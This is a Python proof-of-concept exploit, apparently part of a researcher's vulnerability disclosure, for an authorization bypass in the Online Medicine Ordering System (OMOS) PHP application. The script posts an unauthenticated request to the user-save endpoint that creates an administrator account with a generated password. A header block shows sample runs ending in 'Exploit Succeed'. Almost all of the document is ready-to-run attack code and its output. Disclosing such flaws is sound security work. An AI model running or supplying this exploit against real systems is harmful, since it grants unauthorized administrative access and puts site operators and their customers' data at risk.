import requests
import argparse
import random
import string

''' 
# Title        : OMOS - Open Source Medicine Ordering System Authorization Bypass Exploit
# Details      : https://github.com/bunyamindemir/vulnerability-disclosures/omos-authorization-bypass.md
# Exploit-db   : waiting
# CVE          : Not Yet Assigned
# Author       : Bunyamin Demir from Enforsec A. Ş.
# Contact      : bunyamin.demir@enforsec.com
# Date         : 28/08/2024
# Vendor Homepage: https://www.sourcecodester.com/php/15359/online-medicine-ordering-system-phpoop-free-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=15359&title=Online+Medicine+Ordering+System+in+PHP%2FOOP+Free+Source+Code
# Sample Usages

Python Command 1:

% python3 omos_unauthorized_operation_exploit.py --url http://192.168.1.34/omos --firstname a1 --lastname c1 --middlename b1 --type 1 --username dd223

Command Response 1:

HTTP Status Code: 200
Response: 1
Exploit Succeed
Generated Password: 7ydD0VgV
Registered Username: dd223

Python Command 2:

% python3 omos_unauthorized_operation_exploit.py --url http://192.168.1.34/omos

Command Response 2:

HTTP Status Code: 200
Response: 1
Exploit Succeed
Generated Password: 7erkCjK1
Registered Username: enforsec_admin3
'''
def generate_random_password(length=8):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def create_multipart_request(url, firstname, middlename, lastname, username, user_type):
    # Generate a random password
    password = generate_random_password()
    
    # Create multipart form data
    files = {
        'img': ('', b'', 'application/octet-stream')  # Boş bir dosya olarak img alanı
    }
    data = {
        'id': '',
        'firstname': firstname,
        'middlename': middlename,
        'lastname': lastname,
        'username': username,
        'password': password,
        'type': user_type
    }

    url = url + "/classes/Users.php?f=save"

    # Make the HTTP request
    response = requests.post(url, files=files, data=data)

    # Print the results
    print(f"HTTP Status Code: {response.status_code}")
    print(f"Response: {response.text}")

    if response.status_code == 200 and '1' in response.text:
        print(f"Exploit Succeed")
        print(f"Generated Password: {password}")
        print(f"Registered Username: {username}")
    else:
        print("Request did not return the expected response.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Script to create a WebKitFormBoundary HTTP request to exploit this vulnerability.')

    # Define command line arguments
    parser.add_argument('--url', type=str, default="http://192.168.1.34/omos/", help="The URL where the HTTP request will be sent")
    parser.add_argument('--firstname', type=str, default="EnforsecName3", help="Registered user's first name")
    parser.add_argument('--middlename', type=str, default="EnforsecMiddleName3", help="Registered user's middle name")
    parser.add_argument('--lastname', type=str, default="EnforsecLastName3", help="Registered user's last name")
    parser.add_argument('--username', type=str, default="enforsec_admin3", help="Registered user's username")
    parser.add_argument('--type', type=str, default="1", help="Add user as administrator")

    args = parser.parse_args()

    # Call the function to create the HTTP request
    create_multipart_request(args.url, args.firstname, args.middlename, args.lastname, args.username, args.type)
